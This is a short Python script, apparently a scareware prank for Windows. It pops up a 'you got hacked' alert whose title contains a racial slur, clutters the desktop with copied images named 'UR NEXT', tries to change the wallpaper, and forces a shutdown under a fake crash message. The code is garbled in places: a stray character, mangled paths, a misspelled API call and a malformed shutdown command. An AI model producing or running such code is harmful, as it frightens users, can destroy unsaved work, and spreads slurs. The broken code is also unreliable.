import time 
import pymsgbox
import os 
import shutil
import ctypes



pymsgbox.alert(icon=4096 + 16 , text="you got  hacked lol ", title="Hi nigga")
é


time.sleep(3)

dpath= os.environ["USERPROFILE" ] + "\Desktop"


if os.path.exists(os.environ["USERPROFILE"] + "\Desktop"):
    dpath = os.environ["USERPROFILE"] + "/oneDrive/Desktop"
for i in range (10):
    shutil.copy(r"C:`\windows\system32\securityandmaintenance_error.png",dpath +"UR NEXT" + str(i)+".png")


ctypes.windll.user32.SystemParametersInfow(20, 0, r"C:`\windows\system32\securityandmaintenance_error.png",0)

time.sleep(5)
os.system("shutdown.exe/s /f /t 5/c\"windows.exe has crashed  , shutting down in 10 seconds\"")